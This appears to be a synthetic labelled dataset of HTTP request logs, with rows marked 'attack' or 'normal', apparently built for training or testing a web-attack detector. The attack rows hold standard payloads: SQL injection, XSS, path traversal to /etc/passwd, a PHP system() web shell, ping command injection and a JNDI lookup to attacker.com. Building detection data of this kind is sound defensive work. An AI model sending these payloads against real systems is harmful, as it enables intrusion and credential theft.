id,timestamp,method,path,http_headers,body,label
c82ffce7-5676-4001-b1c1-68793280b678,2026-02-25 03:00:07,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
2c7549e7-e2d1-4917-87e4-64fb97c3b673,2026-02-24 19:32:04,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
a4aafdb8-c33f-43e3-8c69-be90be96bb48,2026-02-24 06:45:44,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
e50dce09-3452-49f7-9d76-551742802464,2026-02-24 17:03:10,DELETE,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Nikto/2.1.6,<script>alert('XSS')</script>,attack
5e353da6-011c-4be3-9376-037804712555,2026-02-24 23:53:11,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
cbf54327-7e99-4c82-81d1-20111fbe4113,2026-02-25 02:39:52,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
01b394be-08c5-4807-aade-29636695147c,2026-02-25 09:17:53,POST,/cart,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
9d606673-f709-4096-9d4e-2cebf5a6748d,2026-02-24 07:09:57,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
0bfbce64-689e-43fb-a4f9-d7628a659fc5,2026-02-24 17:21:22,POST,/contact,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
5a92e2e9-7193-4873-8ad3-bdc58cb49f43,2026-02-24 21:19:54,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
7465e78e-c7c6-4094-bad1-9b958b8f8ba4,2026-02-24 20:42:32,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: python-requests/2.25.1,<?php system($_GET['cmd']); ?>,attack
a5e20227-0ed7-4b42-a494-95dfa622c16a,2026-02-24 12:22:51,GET,/contact,User-Agent: Safari/537.36,,normal
2c416760-6854-40de-8ffe-0b2973de0eec,2026-02-24 09:14:03,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
6b3566e5-8d16-4f98-91e8-8d2ccc8dc719,2026-02-24 13:04:01,GET,/api/v1/users,User-Agent: Safari/537.36,,normal
7b148abe-f69c-4bb2-adb2-04f7e80bbc7b,2026-02-25 08:59:19,GET,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
53a651a4-8c1d-4c31-b207-4897e256a36c,2026-02-25 01:23:34,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
cd6ab50e-47f0-497c-8c40-08c405e8965b,2026-02-24 09:38:03,POST,/products,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
7b62407c-021e-4b3f-b832-5820b34a49b0,2026-02-24 16:49:30,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
6d5e8e0b-d61f-4e7a-8436-d82a477356f9,2026-02-24 23:55:16,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
93705f61-66d0-48e5-b87a-610249f0b9ec,2026-02-24 10:51:05,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
c32f6694-bcc8-47c1-bfa6-0bde77c7f78e,2026-02-24 14:31:07,POST,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
d4d29e3c-12fb-409f-aaa8-b66f57b73219,2026-02-24 17:43:35,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
6513d7e6-6cd8-4110-90ac-1b39a56b9c43,2026-02-24 13:38:00,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
2fe5aa3f-7012-4a8c-92e3-3fef97cc43de,2026-02-24 17:36:45,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
48ea3a15-5b9e-4f99-9b5d-c178151c1648,2026-02-24 23:09:56,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
3d18deda-d943-47f3-b533-1b949eceb12a,2026-02-25 08:35:37,POST,/home,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
674e45fa-1a90-41c3-9e53-ce8cad1af64c,2026-02-24 14:12:08,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
0f6cb1a0-d57f-48e7-8890-7060d2f28778,2026-02-24 10:39:14,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
8330ec3d-f4a1-4d49-9844-a053ac0cbeda,2026-02-25 02:12:51,GET,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
75ba13b4-a71a-4bdb-a076-d6a088db843c,2026-02-25 06:45:05,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
330bab72-88e5-4d25-b2b5-ecb4aaa36a79,2026-02-24 23:20:35,POST,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
67862a13-d426-468e-ac7f-5432272ed224,2026-02-25 06:00:21,POST,/api/v1/orders?status=completed,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
c4e7faf7-0300-437d-bfae-ab5f120a6164,2026-02-24 14:32:31,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
64141a8b-d738-4946-aeab-288016eb0682,2026-02-25 03:39:38,GET,/api/v1/users,User-Agent: Safari/537.36,,normal
6e92d2a1-09be-416b-beda-955bc85d4bbb,2026-02-24 07:05:59,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
9683d889-19d7-41ee-b1d3-bcfb0a534772,2026-02-24 06:55:36,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Nikto/2.1.6,' OR 1=1 --,attack
7fc3698d-3b92-4ab6-bb77-61d02ca4fae5,2026-02-25 07:41:54,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
fc14dac6-0ff3-41a0-8dd0-0c203923b28a,2026-02-24 10:59:21,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
f2dc18bf-9354-4294-8731-f30b3542250c,2026-02-24 16:23:26,POST,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
fcc4dbb7-7f12-4ed2-bb4f-671ac7221f02,2026-02-24 22:28:52,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
1ea2d788-3272-4a17-a1fe-cba9d3132b38,2026-02-24 09:23:52,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
0335a923-77f5-4fa8-b73a-a7805682b9f8,2026-02-24 15:39:16,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
d7478e29-c90f-4f99-8d47-6f4c2bc04d0b,2026-02-24 07:59:58,GET,/checkout,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
cfd0617b-e240-4f9c-a214-60b790f56cf4,2026-02-24 14:55:29,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
748194f0-2fbe-4be2-a171-eb7b3248be21,2026-02-25 06:53:44,POST,/api/v1/users,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
114808e6-8b92-425a-9c4c-6f94a43e5ba3,2026-02-25 10:11:29,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
37fc9de4-40da-4cd1-afcc-63c8cf5da40f,2026-02-24 15:07:19,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
0dbd056b-afcf-43ef-882d-1d3b11b15383,2026-02-25 02:08:40,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
ea6b72a0-6180-4392-bbc1-7c244c71182d,2026-02-24 08:49:29,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
422f3244-2c83-45aa-a656-9890a87f318f,2026-02-24 06:52:37,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
01752955-0709-4d07-9154-8070bf1e8cc4,2026-02-24 08:24:23,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
f1e87f51-9622-4624-9a82-720cf39e8b87,2026-02-24 16:27:16,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
45c29069-81fb-4d20-b8bf-2c8ae2a9bf38,2026-02-25 03:02:52,POST,/products?id=123,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
ee7a580a-33f3-4bc0-a5b6-2ef721dffb37,2026-02-24 15:58:00,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
83b8c867-0e96-45ae-834f-04b6426c03ee,2026-02-25 02:21:54,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
417c8711-2b69-46a7-b6c2-cf03b1a19a06,2026-02-25 02:42:17,GET,/products?id=123,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
89b1e061-a441-4f86-8825-ed9b50d93a01,2026-02-25 08:39:28,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
dcec669b-9f5f-4220-aa3d-602406d55521,2026-02-24 11:17:51,POST,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
dda1ac96-1243-416c-b1fd-e436d18fc575,2026-02-24 08:59:55,GET,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
3a770c26-be34-4eae-83cf-c57177040492,2026-02-24 07:49:52,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Nikto/2.1.6,|| ping -c 4 127.0.0.1 ||,attack
cbf111f7-0ac4-4365-967e-d6b510826b43,2026-02-24 12:41:31,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
a166d75b-785d-47c4-9892-ecb56d968cbf,2026-02-24 17:19:21,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
e53e0dd5-74c5-49cf-a272-1bd4c6fc62cf,2026-02-24 23:31:43,POST,/blog/article-1,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
1ac7c6bb-e2e5-4ba4-abaa-f7e058f0b2d7,2026-02-24 21:53:45,GET,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
f41e799a-e466-485d-a25f-54297a9fd230,2026-02-25 06:50:32,GET,/checkout,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
3690d960-9493-42c6-a510-3a476c6b5728,2026-02-24 16:52:23,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: sqlmap/1.6,|| ping -c 4 127.0.0.1 ||,attack
23e4a3ac-70dc-4b6a-b0a1-4a7bfa86d40c,2026-02-25 08:28:42,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
1616d9eb-264c-4e51-9f17-c3fb2930c04a,2026-02-25 06:33:04,PUT,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: curl/7.68.0,${jndi:ldap://attacker.com/a},attack
79473aa4-877e-466a-94d2-1b037e5ae69a,2026-02-24 22:43:35,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
e3054835-a4fa-4943-991a-c30d87740dab,2026-02-25 05:36:28,GET,/search?q=shoes,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
e89614de-ec5e-4c13-8c65-a9d769ecf01a,2026-02-24 20:57:17,GET,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
8a5d3003-8014-429c-8253-9d582ac23f77,2026-02-24 10:27:45,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
16af0475-7440-406e-8a84-362047af4c57,2026-02-25 09:01:51,POST,/blog/article-1,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
2a0c68a3-38f8-4c78-af0f-58b570bfed6a,2026-02-25 01:41:36,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
9394970e-90e3-4a47-a0ed-2c593e0b8ece,2026-02-25 00:28:20,GET,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
9d041bed-c836-41fc-a787-812f97367f4e,2026-02-25 05:06:28,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: python-requests/2.25.1,<script>alert('XSS')</script>,attack
2fb77eff-090e-46ea-9dc8-e76b333e09a7,2026-02-24 09:30:30,POST,/contact,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
9374a4f6-86c0-4657-9d27-817cf9854c88,2026-02-25 07:27:55,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
d95c49e1-5e89-43f1-bd6b-6edd8bf802fe,2026-02-24 11:24:42,GET,/checkout,User-Agent: Safari/537.36,,normal
5e024d58-2a6e-43b9-bebc-3142576b35ed,2026-02-25 09:19:56,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
1eda764e-1e56-4556-8245-9ba3c18377ce,2026-02-24 16:16:40,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
ae286d2b-cb56-4116-9913-023881c92500,2026-02-25 05:01:56,GET,/cart,User-Agent: Chrome/120.0.0.0,,normal
759dea91-957b-410a-a4c0-dc6b3f806979,2026-02-25 06:25:18,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
ae501683-2fb8-435f-b2a7-dfd9cb37b497,2026-02-24 23:39:32,POST,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
e148c032-2f5e-4d4b-943f-3c4ed8ff3b1a,2026-02-25 07:40:58,GET,/products?id=123,User-Agent: Safari/537.36,,normal
0d213c81-39c1-4add-b19f-c7b5dc756273,2026-02-24 12:09:16,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
bf8ad0c8-d36e-4a91-8314-ad152fa60e5e,2026-02-24 19:04:46,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
3e5936fd-c1b7-4592-a700-b70c91160e41,2026-02-24 21:45:23,PUT,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
b33b459a-c1cb-4fb7-b9ef-e67a3038351d,2026-02-24 14:01:01,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
339a0c6d-d720-4e00-a776-27b64ab626af,2026-02-24 19:23:18,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
f06077c8-5cb5-4d01-b877-d495bc728741,2026-02-24 22:25:42,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
41feb1c0-f090-4a62-9cba-331a1be86a9e,2026-02-25 05:02:21,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),SELECT * FROM users WHERE id = 1 OR 1=1,attack
ff1b8f00-7472-4801-9fe2-dcb3d5150562,2026-02-24 13:04:02,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: curl/7.68.0,../../etc/passwd,attack
86b5b0d2-ae44-43ea-a86f-8d86aa574356,2026-02-24 10:04:39,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: sqlmap/1.6,${jndi:ldap://attacker.com/a},attack
b95f68b3-0838-4cec-8e61-a2d977559963,2026-02-25 03:14:27,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: curl/7.68.0,|| ping -c 4 127.0.0.1 ||,attack
e2e3ffe7-ac61-43a1-864d-f4d7d40c768c,2026-02-24 07:01:35,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
ff94c644-3ee4-43f7-80e9-3175972c3139,2026-02-24 11:19:10,POST,/search?q=shoes,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
ff7ba83d-7f00-4fea-be1b-2d86e5e31774,2026-02-24 23:16:27,POST,/contact,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
66aa3426-acf6-4b17-b501-1651757608f0,2026-02-25 03:53:01,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: curl/7.68.0,<img src=x onerror=alert(1)>,attack
